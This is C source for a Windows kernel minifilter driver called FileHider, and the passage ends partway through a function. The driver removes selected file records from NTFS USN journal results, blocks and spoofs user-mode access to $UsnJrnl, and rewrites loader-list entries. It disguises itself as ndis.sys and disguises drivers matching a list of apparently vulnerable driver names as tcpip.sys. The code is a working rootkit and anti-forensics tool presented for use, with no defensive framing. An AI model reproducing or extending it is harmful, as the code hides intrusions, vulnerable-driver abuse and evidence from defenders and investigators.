// FileHider.c — NTFS USN journal entry remover (minifilter).
//
// v17 — deferred hide via IOCTL, stable load, driver renames applied
//       after the app has connected.

#define NTDDI_VERSION 0x0A000007
#define _WIN32_WINNT 0x0A00
#include <fltKernel.h>
#include <ntifs.h>
#include <ntddk.h>

#define DEVICE_NAME     L"\\Device\\FileHider"
#define SYMLINK_NAME    L"\\DosDevices\\FileHider"
#define FILTER_INSTANCE L"FsPolicyInst"
#define FILTER_ALTITUDE L"429990"

#define FH_MAGIC        0x4F555443u
#define FH_VERSION      17u

#define IOCTL_ADD_RULE          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_REMOVE_RULE       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_CLEAR_RULES       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GET_COUNT         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x903, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_LIST_RULES        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x904, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GET_STATUS        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x905, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SET_SPOOF         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x906, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GET_SPOOF         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x907, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SET_HIDE_JOURNAL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x908, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GET_HIDE_JOURNAL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x909, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_RESET             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x90A, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_NOW          CTL_CODE(FILE_DEVICE_UNKNOWN, 0x90B, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define MAX_RULES        512
#define MAX_STRING_CHARS 260
#define RAW_DUMP_BYTES   256
#define FIRSTNAME_CHARS  64
#define MAX_FSCTL_BYTES  0x40000000u
#define MAX_RENAMES      16

typedef struct _RULE_ENTRY {
    WCHAR     String[MAX_STRING_CHARS];
    ULONG     StringLen;
    ULONGLONG Usn;
} RULE_ENTRY, * PRULE_ENTRY;

typedef struct _RULE_REQUEST {
    WCHAR     String[MAX_STRING_CHARS];
    ULONGLONG Usn;
} RULE_REQUEST, * PRULE_REQUEST;

#pragma pack(push, 1)
typedef struct _STATUS_REPLY {
    ULONG     Magic;
    ULONG     Version;
    ULONGLONG SessionId;
    ULONG     FilterAttached;
    ULONG     RuleCount;
    ULONG     LastError;
    ULONG     FsctlHits;
    ULONG     FsctlFiltered;
    ULONG     RecordsSeen;
    ULONG     RecordsRemoved;
    ULONG     ParseFailures;
    ULONG     ReadBlocked;
    ULONG     QuerySpoofed;
    ULONG     FileUsnFiltered;
    ULONG     SpoofEmpty;
    ULONG     HideJournal;
    ULONG     CreateHits;
    ULONG     JournalBlocked;
    ULONG     PreOpSeen;
    ULONG     PostOpSeen;
    ULONG     PostOpNoBuf;
    ULONG     PostOpInfoBad;
    ULONG     ReadPreSeen;
    ULONG     ReadPostSeen;
    ULONG     ReadNoBuf;
    ULONG     ReadInfoBad;
    ULONG     ReadMatched;
    ULONG     ReadNameHits;
    ULONG     CreateNameHits;
    ULONG     CreateUncacheForced;
    ULONG     LastCode;
    ULONG     LastMethod;
    ULONG     LastInfo;
    ULONG     LastOutCap;
    ULONGLONG LastOutBuf;
    ULONG     LastValidate;
    ULONG     LastRecords;
    ULONG     LastFiltered;
    UCHAR     LastRaw[RAW_DUMP_BYTES];
    WCHAR     FirstName[FIRSTNAME_CHARS];
    ULONG     FirstNameLen;
    ULONG     Reserved;
} STATUS_REPLY, * PSTATUS_REPLY;
#pragma pack(pop)

// ─── LDR rename machinery ────────────────────────────────────────

extern PLIST_ENTRY PsLoadedModuleList;

typedef struct _FH_LDR_ENTRY {
    LIST_ENTRY     InLoadOrderLinks;
    LIST_ENTRY     InMemoryOrderLinks;
    LIST_ENTRY     InInitializationOrderLinks;
    PVOID          DllBase;
    PVOID          EntryPoint;
    ULONG          SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} FH_LDR_ENTRY, * PFH_LDR_ENTRY;

typedef struct _FH_RENAME_RECORD {
    PFH_LDR_ENTRY Entry;
    WCHAR         OldFull[520];
    USHORT        OldFullLen;
    WCHAR         OldBase[260];
    USHORT        OldBaseLen;
} FH_RENAME_RECORD;

static FH_RENAME_RECORD g_Renamed[MAX_RENAMES];
static ULONG            g_RenamedCount = 0;
static BOOLEAN          g_SelfHidden = FALSE;
static PDRIVER_OBJECT   g_DriverObject = NULL;

static BOOLEAN RenameUnicode(PUNICODE_STRING target, PCWSTR newStr,
    PWCHAR oldBuf, PUSHORT oldLen,
    ULONG oldBufChars)
{
    if (!target || !target->Buffer || target->MaximumLength < sizeof(WCHAR))
        return FALSE;

    USHORT curLen = target->Length;
    if (curLen > (oldBufChars - 1) * sizeof(WCHAR))
        curLen = (USHORT)((oldBufChars - 1) * sizeof(WCHAR));
    if (curLen > 0) {
        RtlCopyMemory(oldBuf, target->Buffer, curLen);
        oldBuf[curLen / sizeof(WCHAR)] = L'\0';
    }
    *oldLen = curLen;

    SIZE_T newBytes = wcslen(newStr) * sizeof(WCHAR);
    if (newBytes + sizeof(WCHAR) > target->MaximumLength)
        return FALSE;

    RtlCopyMemory(target->Buffer, newStr, newBytes);
    target->Buffer[newBytes / sizeof(WCHAR)] = L'\0';
    target->Length = (USHORT)newBytes;
    return TRUE;
}

static BOOLEAN RenameLdrEntry(PFH_LDR_ENTRY entry, PCWSTR fakeFull, PCWSTR fakeBase)
{
    if (!entry || g_RenamedCount >= MAX_RENAMES) return FALSE;

    FH_RENAME_RECORD* rec = &g_Renamed[g_RenamedCount];
    RtlZeroMemory(rec, sizeof(*rec));
    rec->Entry = entry;

    BOOLEAN a = RenameUnicode(&entry->FullDllName, fakeFull,
        rec->OldFull, &rec->OldFullLen, 520);
    BOOLEAN b = RenameUnicode(&entry->BaseDllName, fakeBase,
        rec->OldBase, &rec->OldBaseLen, 260);

    if (a || b) {
        g_RenamedCount++;
        return TRUE;
    }
    return FALSE;
}

static VOID RestoreAllRenamed(VOID)
{
    for (ULONG i = 0; i < g_RenamedCount; i++) {
        FH_RENAME_RECORD* rec = &g_Renamed[i];
        if (!rec->Entry) continue;
        __try {
            if (rec->Entry->FullDllName.Buffer && rec->OldFullLen > 0) {
                RtlCopyMemory(rec->Entry->FullDllName.Buffer, rec->OldFull,
                    rec->OldFullLen);
                rec->Entry->FullDllName.Buffer[rec->OldFullLen / sizeof(WCHAR)] = L'\0';
                rec->Entry->FullDllName.Length = rec->OldFullLen;
            }
            if (rec->Entry->BaseDllName.Buffer && rec->OldBaseLen > 0) {
                RtlCopyMemory(rec->Entry->BaseDllName.Buffer, rec->OldBase,
                    rec->OldBaseLen);
                rec->Entry->BaseDllName.Buffer[rec->OldBaseLen / sizeof(WCHAR)] = L'\0';
                rec->Entry->BaseDllName.Length = rec->OldBaseLen;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }
    g_RenamedCount = 0;
    g_SelfHidden = FALSE;
}

static BOOLEAN StrContainsCI(PCWSTR haystack, PCWSTR needle)
{
    if (!haystack || !needle) return FALSE;
    size_t nh = wcslen(haystack), nn = wcslen(needle);
    if (nn == 0 || nn > nh) return FALSE;
    for (size_t i = 0; i + nn <= nh; i++) {
        BOOLEAN ok = TRUE;
        for (size_t j = 0; j < nn; j++) {
            WCHAR a = haystack[i + j], b = needle[j];
            if (a >= L'A' && a <= L'Z') a = (WCHAR)(a + 32);
            if (b >= L'A' && b <= L'Z') b = (WCHAR)(b + 32);
            if (a != b) { ok = FALSE; break; }
        }
        if (ok) return TRUE;
    }
    return FALSE;
}

static BOOLEAN AlreadyRenamed(PFH_LDR_ENTRY e)
{
    for (ULONG i = 0; i < g_RenamedCount; i++)
        if (g_Renamed[i].Entry == e) return TRUE;
    return FALSE;
}

// Rename every entry whose BaseDllName contains "rtcore", "winio", etc.
static ULONG RenameVulnEntries(VOID)
{
    if (!PsLoadedModuleList) return 0;

    PCWSTR patterns[] = {
        L"rtcore", L"rtcore64", L"winio", L"winring",
        L"gdrv", L"kprocess", L"iomap", L"dbutil",
        L"asusio", L"asupio", L"cpuz", L"msio",
    };
    const ULONG pc = sizeof(patterns) / sizeof(patterns[0]);

    ULONG renamed = 0;

    __try {
        for (PLIST_ENTRY p = PsLoadedModuleList->Flink;
            p && p != PsLoadedModuleList;
            p = p->Flink)
        {
            PFH_LDR_ENTRY e = (PFH_LDR_ENTRY)p;
            if (AlreadyRenamed(e)) continue;
            if (!e->BaseDllName.Buffer || e->BaseDllName.Length == 0) continue;

            __try {
                USHORT chars = e->BaseDllName.Length / sizeof(WCHAR);
                if (chars >= 260) continue;
                WCHAR nameBuf[260];
                RtlCopyMemory(nameBuf, e->BaseDllName.Buffer,
                    e->BaseDllName.Length);
                nameBuf[chars] = L'\0';

                BOOLEAN hit = FALSE;
                for (ULONG i = 0; i < pc; i++)
                    if (StrContainsCI(nameBuf, patterns[i])) { hit = TRUE; break; }

                if (hit) {
                    RenameLdrEntry(e,
                        L"\\SystemRoot\\System32\\drivers\\tcpip.sys",
                        L"tcpip.sys");
                    renamed++;
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {}
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}

    return renamed;
}

static VOID HideSelfOnce(VOID)
{
    if (g_SelfHidden) return;
    if (!g_DriverObject || !g_DriverObject->DriverSection) return;

    PFH_LDR_ENTRY e = (PFH_LDR_ENTRY)g_DriverObject->DriverSection;
    if (AlreadyRenamed(e)) { g_SelfHidden = TRUE; return; }

    __try {
        if (RenameLdrEntry(e,
            L"\\SystemRoot\\System32\\drivers\\ndis.sys",
            L"ndis.sys"))
        {
            g_SelfHidden = TRUE;
            DbgPrint("FileHider: renamed own LDR entry\n");
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {}
}

// ─── diagnostics ─────────────────────────────────────────────────

static RULE_ENTRY  g_Rules[MAX_RULES];
static ULONG       g_RuleCount = 0;
static ERESOURCE   g_RuleLock;
static PFLT_FILTER g_FltHandle = NULL;
static ULONG       g_LastError = 0;
static BOOLEAN     g_Started = FALSE;
static ULONGLONG   g_SessionId = 0;
static BOOLEAN     g_SpoofEmpty = FALSE;
static BOOLEAN     g_HideJournal = FALSE;

static volatile LONG g_FsctlHits = 0;
static volatile LONG g_FsctlFiltered = 0;
static volatile LONG g_RecordsSeen = 0;
static volatile LONG g_RecordsRemoved = 0;
static volatile LONG g_ParseFailures = 0;
static volatile LONG g_ReadBlocked = 0;
static volatile LONG g_QuerySpoofed = 0;
static volatile LONG g_FileUsnFiltered = 0;
static volatile LONG g_CreateHits = 0;
static volatile LONG g_JournalBlocked = 0;
static volatile LONG g_PreOpSeen = 0;
static volatile LONG g_PostOpSeen = 0;
static volatile LONG g_PostOpNoBuf = 0;
static volatile LONG g_PostOpInfoBad = 0;
static volatile LONG g_ReadPreSeen = 0;
static volatile LONG g_ReadPostSeen = 0;
static volatile LONG g_ReadNoBuf = 0;
static volatile LONG g_ReadInfoBad = 0;
static volatile LONG g_ReadMatched = 0;
static volatile LONG g_ReadNameHits = 0;
static volatile LONG g_CreateNameHits = 0;
static volatile LONG g_CreateUncacheForced = 0;
static volatile LONG g_LastCode = 0;
static volatile LONG g_LastMethod = 0;
static volatile LONG g_LastInfo = 0;
static volatile LONG g_LastOutCap = 0;
static ULONGLONG g_LastOutBuf = 0;
static volatile LONG g_LastValidate = 0;
static volatile LONG g_LastRecords = 0;
static volatile LONG g_LastFiltered = 0;
static UCHAR g_LastRaw[RAW_DUMP_BYTES];
static WCHAR g_FirstName[FIRSTNAME_CHARS];
static ULONG g_FirstNameLen = 0;
static KSPIN_LOCK g_DiagLock;

DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD FileHiderUnload;
DRIVER_DISPATCH FileHiderCreateClose;
DRIVER_DISPATCH FileHiderDeviceControl;

FLT_PREOP_CALLBACK_STATUS  CreatePreOp(PFLT_CALLBACK_DATA, PCFLT_RELATED_OBJECTS, PVOID*);
FLT_PREOP_CALLBACK_STATUS  ReadPreOp(PFLT_CALLBACK_DATA, PCFLT_RELATED_OBJECTS, PVOID*);
FLT_POSTOP_CALLBACK_STATUS ReadPostOp(PFLT_CALLBACK_DATA, PCFLT_RELATED_OBJECTS, PVOID, FLT_POST_OPERATION_FLAGS);
FLT_POSTOP_CALLBACK_STATUS DirControlPostOp(PFLT_CALLBACK_DATA, PCFLT_RELATED_OBJECTS, PVOID, FLT_POST_OPERATION_FLAGS);
FLT_PREOP_CALLBACK_STATUS  FsControlPreOp(PFLT_CALLBACK_DATA, PCFLT_RELATED_OBJECTS, PVOID*);
FLT_POSTOP_CALLBACK_STATUS FsControlPostOp(PFLT_CALLBACK_DATA, PCFLT_RELATED_OBJECTS, PVOID, FLT_POST_OPERATION_FLAGS);

static VOID RuleLock(VOID) { ExAcquireResourceExclusiveLite(&g_RuleLock, TRUE); }
static VOID RuleUnlock(VOID) { ExReleaseResourceLite(&g_RuleLock); }
static ULONG RuleCountSnapshot(VOID)
{
    RuleLock(); ULONG n = g_RuleCount; RuleUnlock(); return n;
}

static VOID SaveDiagRaw(PUCHAR base, ULONG info, PUNICODE_STRING firstName, ULONG recCount)
{
    KIRQL irql;
    KeAcquireSpinLock(&g_DiagLock, &irql);
    ULONG n = info < RAW_DUMP_BYTES ? info : RAW_DUMP_BYTES;
    if (n > 0 && base) RtlCopyMemory(g_LastRaw, base, n);
    if (n < RAW_DUMP_BYTES) RtlZeroMemory(g_LastRaw + n, RAW_DUMP_BYTES - n);
    if (firstName && firstName->Length > 0) {
        ULONG copyLen = firstName->Length;
        if (copyLen > (FIRSTNAME_CHARS - 1) * sizeof(WCHAR))
            copyLen = (FIRSTNAME_CHARS - 1) * sizeof(WCHAR);
        RtlCopyMemory(g_FirstName, firstName->Buffer, copyLen);
        g_FirstName[copyLen / sizeof(WCHAR)] = L'\0';
        g_FirstNameLen = copyLen;
    }
    else { g_FirstName[0] = L'\0'; g_FirstNameLen = 0; }
    KeReleaseSpinLock(&g_DiagLock, irql);
    InterlockedExchange(&g_LastRecords, (LONG)recCount);
}

static VOID SaveDiagInfo(LONG code, LONG method, LONG info, LONG cap,
    ULONGLONG buf, LONG verdict, LONG removed)
{
    InterlockedExchange(&g_LastCode, code);
    InterlockedExchange(&g_LastMethod, method);
    InterlockedExchange(&g_LastInfo, info);
    InterlockedExchange(&g_LastOutCap, cap);
    g_LastOutBuf = buf;
    InterlockedExchange(&g_LastValidate, verdict);
    InterlockedExchange(&g_LastFiltered, removed);
}

static BOOLEAN MatchSubstring(PUNICODE_STRING name, PCWSTR needleStr)
{
    if (!name || name->Length == 0 || !needleStr) return FALSE;
    if (needleStr[0] == L'\0') return FALSE;
    UNICODE_STRING needle;
    RtlInitUnicodeString(&needle, needleStr);
    if (needle.Length == 0 || needle.Length > name->Length) return FALSE;
    ULONG maxOff = name->Length - needle.Length;
    for (ULONG off = 0; off <= maxOff; off += sizeof(WCHAR)) {
        UNICODE_STRING sub;
        sub.Buffer = (PWCHAR)((PUCHAR)name->Buffer + off);
        sub.Length = needle.Length;
        sub.MaximumLength = needle.Length;
        if (RtlEqualUnicodeString(&sub, &needle, TRUE)) return TRUE;
    }
    return FALSE;
}

static BOOLEAN IsUsnJournalName(PUNICODE_STRING name)
{
    return MatchSubstring(name, L"$UsnJrnl");
}

static BOOLEAN MatchRule(PUNICODE_STRING name, ULONGLONG usn)
{
    for (ULONG i = 0; i < g_RuleCount; i++) {
        if (g_Rules[i].Usn != 0) {
            if (usn != 0 && usn == g_Rules[i].Usn) return TRUE;
        }
        else if (g_Rules[i].StringLen > 0) {
            if (name && name->Length > 0 && MatchSubstring(name, g_Rules[i].String))
                return TRUE;
        }
    }
    return FALSE;
}

static BOOLEAN TryGetFileName(PFLT_CALLBACK_DATA Data, PUNICODE_STRING outName,
    PFLT_FILE_NAME_INFORMATION* ppInfo)
{
    PFLT_FILE_NAME_INFORMATION ni = NULL;
    NTSTATUS s = FltGetFileNameInformation(Data,
        FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_ALWAYS_ALLOW_CACHE_LOOKUP, &ni);
    if (!NT_SUCCESS(s) || !ni) {
        s = FltGetFileNameInformation(Data,
            FLT_FILE_NAME_OPENED | FLT_FILE_NAME_QUERY_ALWAYS_ALLOW_CACHE_LOOKUP, &ni);
    }
    if (!NT_SUCCESS(s) || !ni) return FALSE;
    *outName = ni->Name;
    *ppInfo = ni;
    return TRUE;
}

static NTSTATUS EnsureRegistry(PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING drvName = DriverObject->DriverName;
    if (drvName.Length == 0 || !drvName.Buffer) return STATUS_INVALID_PARAMETER;
    USHORT chars = drvName.Length / sizeof(WCHAR);
    USHORT i = chars;
    while (i > 0 && drvName.Buffer[i - 1] != L'\\') i--;
    UNICODE_STRING leaf;
    leaf.Buffer = &drvName.Buffer[i];
    leaf.Length = (USHORT)((chars - i) * sizeof(WCHAR));
    leaf.MaximumLength = leaf.Length;
    if (leaf.Length == 0) return STATUS_INVALID_PARAMETER;

    WCHAR path[512];
    UNICODE_STRING uPath, prefix, instSuffix;
    OBJECT_ATTRIBUTES oa;
    RtlZeroMemory(path, sizeof(path));
    RtlInitUnicodeString(&prefix, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\");
    if ((ULONG)(prefix.Length + leaf.Length) >= sizeof(path)) return STATUS_BUFFER_TOO_SMALL;
    RtlCopyMemory(path, prefix.Buffer, prefix.Length);
    RtlCopyMemory((PUCHAR)path + prefix.Length, leaf.Buffer, leaf.Length);
    uPath.Buffer = path;
    uPath.Length = prefix.Length + leaf.Length;
    uPath.MaximumLength = uPath.Length + 2 * sizeof(WCHAR);

    RtlInitUnicodeString(&instSuffix, L"\\Instances");
    if ((ULONG)(uPath.Length + instSuffix.Length) >= sizeof(path)) return STATUS_BUFFER_TOO_SMALL;
    RtlCopyMemory((PUCHAR)path + uPath.Length, instSuffix.Buffer, instSuffix.Length);
    uPath.Length += instSuffix.Length;

    InitializeObjectAttributes(&oa, &uPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    HANDLE hInstances = NULL;
    NTSTATUS s = ZwCreateKey(&hInstances, KEY_WRITE, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    if (!NT_SUCCESS(s)) return s;

    UNICODE_STRING valName, valData;
    RtlInitUnicodeString(&valName, L"DefaultInstance");
    RtlInitUnicodeString(&valData, FILTER_INSTANCE);
    ZwSetValueKey(hInstances, &valName, 0, REG_SZ, valData.Buffer, valData.Length + sizeof(WCHAR));

    RtlZeroMemory(path, sizeof(path));
    RtlCopyMemory(path, prefix.Buffer, prefix.Length);
    RtlCopyMemory((PUCHAR)path + prefix.Length, leaf.Buffer, leaf.Length);
    ULONG total = prefix.Length + leaf.Length;
    RtlInitUnicodeString(&instSuffix, L"\\Instances\\");
    RtlCopyMemory((PUCHAR)path + total, instSuffix.Buffer, instSuffix.Length);
    total += instSuffix.Length;
    RtlCopyMemory((PUCHAR)path + total, valData.Buffer, valData.Length);
    total += valData.Length;

    UNICODE_STRING instancePath;
    instancePath.Buffer = path;
    instancePath.Length = (USHORT)total;
    instancePath.MaximumLength = (USHORT)(total + 2);

    InitializeObjectAttributes(&oa, &instancePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    HANDLE hInstance = NULL;
    s = ZwCreateKey(&hInstance, KEY_WRITE, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    if (NT_SUCCESS(s)) {
        RtlInitUnicodeString(&valName, L"Altitude");
        RtlInitUnicodeString(&valData, FILTER_ALTITUDE);
        ZwSetValueKey(hInstance, &valName, 0, REG_SZ, valData.Buffer, valData.Length + sizeof(WCHAR));
        RtlInitUnicodeString(&valName, L"Flags");
        ULONG flags = 0;
        ZwSetValueKey(hInstance, &valName, 0, REG_DWORD, &flags, sizeof(flags));
        ZwClose(hInstance);
    }
    ZwClose(hInstances);
    return STATUS_SUCCESS;
}

static BOOLEAN ValidateUsnStream(PUCHAR base, ULONG info, ULONG startOff,
    ULONG* pCount, ULONG* pWalkEnd)
{
    if (info < startOff + 24) return FALSE;
    ULONG walk = startOff, count = 0;
    while (walk + 8 <= info) {
        ULONG recLen = *(ULONG*)(base + walk);
        if (recLen < 24 || recLen > 0x10000) { if (pWalkEnd) *pWalkEnd = walk; break; }
        if (walk + recLen > info) { if (pWalkEnd) *pWalkEnd = walk; break; }
        USHORT major = *(USHORT*)(base + walk + 4);
        if (major != 2 && major != 3) { if (pWalkEnd) *pWalkEnd = walk; break; }
        int headerSize = (major == 2) ? 60 : 76;
        if (recLen < (ULONG)headerSize) { if (pWalkEnd) *pWalkEnd = walk; break; }
        USHORT nameLen = *(USHORT*)(base + walk + headerSize - 4);
        USHORT nameOff = *(USHORT*)(base + walk + headerSize - 2);
        if ((ULONG)nameOff + (ULONG)nameLen > recLen) { if (pWalkEnd) *pWalkEnd = walk; break; }
        count++;
        walk = (walk + recLen + 7) & ~7;
    }
    if (pWalkEnd) *pWalkEnd = walk;
    if (pCount) *pCount = count;
    return count > 0;
}

static VOID FilterUsnStream(PUCHAR base, ULONG info, ULONG startOff,
    PULONG pNewInfo, PBOOLEAN pAnyFiltered,
    PULONG pRemoved, PUNICODE_STRING pFirstName)
{
    ULONG cur = startOff, newEnd = startOff;
    BOOLEAN anyFiltered = FALSE;
    ULONG removed = 0;
    BOOLEAN firstNameSet = FALSE;

    while (cur + 8 <= info) {
        ULONG recLen = *(ULONG*)(base + cur);
        if (recLen < 24 || recLen > 0x10000 || cur + recLen > info) {
            ULONG tailLen = info - cur;
            if (cur != newEnd) RtlMoveMemory(base + newEnd, base + cur, tailLen);
            newEnd += tailLen; break;
        }
        USHORT major = *(USHORT*)(base + cur + 4);
        if (major != 2 && major != 3) {
            ULONG tailLen = info - cur;
            if (cur != newEnd) RtlMoveMemory(base + newEnd, base + cur, tailLen);
            newEnd += tailLen; break;
        }
        int headerSize = (major == 2) ? 60 : 76;
        if (recLen < (ULONG)headerSize) {
            ULONG tailLen = info - cur;
            if (cur != newEnd) RtlMoveMemory(base + newEnd, base + cur, tailLen);
            newEnd += tailLen; break;
        }
        USHORT nameLen = *(USHORT*)(base + cur + headerSize - 4);
        USHORT nameOff = *(USHORT*)(base + cur + headerSize - 2);
        if ((ULONG)nameOff + (ULONG)nameLen > recLen) {
            ULONG tailLen = info - cur;
            if (cur != newEnd) RtlMoveMemory(base + newEnd, base + cur, tailLen);
            newEnd += tailLen; break;
        }
        int usnOff = (major == 2) ? 24 : 40;
        ULONGLONG usn = 0;
        if (recLen >= (ULONG)(usnOff + 8)) usn = *(ULONGLONG*)(base + cur + usnOff);
        if (!firstNameSet && nameLen > 0 && pFirstName) {
            pFirstName->Buffer = (PWCHAR)(base + cur + nameOff);
            pFirstName->Length = nameLen;
            pFirstName->MaximumLength = nameLen;
            firstNameSet = TRUE;
        }
        BOOLEAN remove = FALSE;
        RuleLock();
        if (nameLen > 0) {
            UNICODE_STRING name;
            name.Buffer = (PWCHAR)(base + cur + nameOff);
            name.Length = nameLen; name.MaximumLength = nameLen;
            remove = MatchRule(&name, usn);
        }
        else remove = MatchRule(NULL, usn);
        RuleUnlock();
        if (!remove) {
            if (cur != newEnd) RtlMoveMemory(base + newEnd, base + cur, recLen);
            newEnd += recLen;
        }
        else { anyFiltered = TRUE; removed++; }
        cur = (cur + recLen + 7) & ~7;
    }
    *pNewInfo = newEnd; *pAnyFiltered = anyFiltered; *pRemoved = removed;
}

FLT_PREOP_CALLBACK_STATUS
CreatePreOp(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext)
{
    UNREFERENCED_PARAMETER(FltObjects); UNREFERENCED_PARAMETER(CompletionContext);
    if (Data->Iopb->MajorFunction != IRP_MJ_CREATE) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    if (Data->RequestorMode == KernelMode) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    InterlockedIncrement(&g_CreateHits);
    if (!g_HideJournal) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    if (!Data->Iopb->Parameters.Create.SecurityContext) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    UNICODE_STRING name;
    PFLT_FILE_NAME_INFORMATION ni = NULL;
    if (!TryGetFileName(Data, &name, &ni)) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    BOOLEAN deny = IsUsnJournalName(&name);
    FltReleaseFileNameInformation(ni);
    if (deny) {
        InterlockedIncrement(&g_JournalBlocked);
        Data->IoStatus.Status = STATUS_OBJECT_NAME_NOT_FOUND;
        Data->IoStatus.Information = 0;
        return FLT_PREOP_COMPLETE;
    }
    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_PREOP_CALLBACK_STATUS
ReadPreOp(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext)
{
    UNREFERENCED_PARAMETER(FltObjects); UNREFERENCED_PARAMETER(CompletionContext);
    if (Data->Iopb->MajorFunction != IRP_MJ_READ) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    if (Data->RequestorMode == KernelMode) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    ULONG ruleCount = RuleCountSnapshot();
    if (!g_HideJournal && ruleCount == 0) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    UNICODE_STRING name;
    PFLT_FILE_NAME_INFORMATION ni = NULL;
    if (!TryGetFileName(Data, &name, &ni)) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    BOOLEAN isJ = IsUsnJournalName(&name);
    FltReleaseFileNameInformation(ni);
    if (!isJ) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    InterlockedIncrement(&g_ReadPreSeen);
    if (g_HideJournal) {
        InterlockedIncrement(&g_ReadBlocked);
        InterlockedIncrement(&g_JournalBlocked);
        Data->IoStatus.Status = STATUS_SUCCESS;
        Data->IoStatus.Information = 0;
        return FLT_PREOP_COMPLETE;
    }
    return FLT_PREOP_SYNCHRONIZE;
}

FLT_PREOP_CALLBACK_STATUS
FsControlPreOp(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects, PVOID* CompletionContext)
{
    UNREFERENCED_PARAMETER(FltObjects); UNREFERENCED_PARAMETER(CompletionContext);
    if (Data->Iopb->MinorFunction != IRP_MN_USER_FS_REQUEST) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    ULONG code = Data->Iopb->Parameters.FileSystemControl.Common.FsControlCode;
    if (code != FSCTL_ENUM_USN_DATA && code != FSCTL_READ_USN_JOURNAL &&
        code != FSCTL_QUERY_USN_JOURNAL && code != FSCTL_READ_FILE_USN_DATA)
        return FLT_PREOP_SUCCESS_NO_CALLBACK;
    if (Data->RequestorMode == KernelMode) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    InterlockedIncrement(&g_PreOpSeen);
    if (g_HideJournal) {
        InterlockedIncrement(&g_JournalBlocked);
        Data->IoStatus.Status = STATUS_OBJECT_NAME_NOT_FOUND;
        Data->IoStatus.Information = 0;
        return FLT_PREOP_COMPLETE;
    }
    if (code == FSCTL_QUERY_USN_JOURNAL) {
        if (!g_SpoofEmpty) return FLT_PREOP_SUCCESS_NO_CALLBACK;
        return FLT_PREOP_SYNCHRONIZE;
    }
    if (RuleCountSnapshot() == 0) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    ULONG method = code & 3;
    PVOID outBuf = NULL; ULONG outLen = 0;
    if (method == METHOD_NEITHER) {
        outBuf = Data->Iopb->Parameters.FileSystemControl.Neither.OutputBuffer;
        outLen = Data->Iopb->Parameters.FileSystemControl.Neither.OutputBufferLength;
    }
    else {
        outBuf = Data->Iopb->Parameters.FileSystemControl.Buffered.SystemBuffer;
        outLen = Data->Iopb->Parameters.FileSystemControl.Buffered.OutputBufferLength;
    }
    if (!outBuf || outLen < 16 || outLen > MAX_FSCTL_BYTES) return FLT_PREOP_SUCCESS_NO_CALLBACK;
    if (method == METHOD_NEITHER) {
        __try { ProbeForWrite(outBuf, outLen, sizeof(ULONG)); }
        __except (EXCEPTION_EXECUTE_HANDLER) { return FLT_PREOP_SUCCESS_NO_CALLBACK; }
    }
    return FLT_PREOP_SYNCHRONIZE;
}

FLT_POSTOP_CALLBACK_STATUS
FsControlPostOp(PFLT_CALLBACK_DATA Data, PCFLT_RELATED_OBJECTS FltObjects,
    PVOID CompletionContext, FLT_POST_OPERATION_FLAGS Flags)
{
    UNREFERENCED_PARAMETER(FltObjects); UNREFERENCED_PARAMETER(CompletionContext);
    if (Flags & FLTFL_POST_OPERATION_DRAINING) return FLT_POSTOP_FINISHED_PROCESSING;
    if (!NT_SUCCESS(Data->IoStatus.Status)) return FLT_POSTOP_FINISHED_PROCESSING;
    if (Data->Iopb->MinorFunction != IRP_MN_USER_FS_REQUEST || Data->RequestorMode == KernelMode)
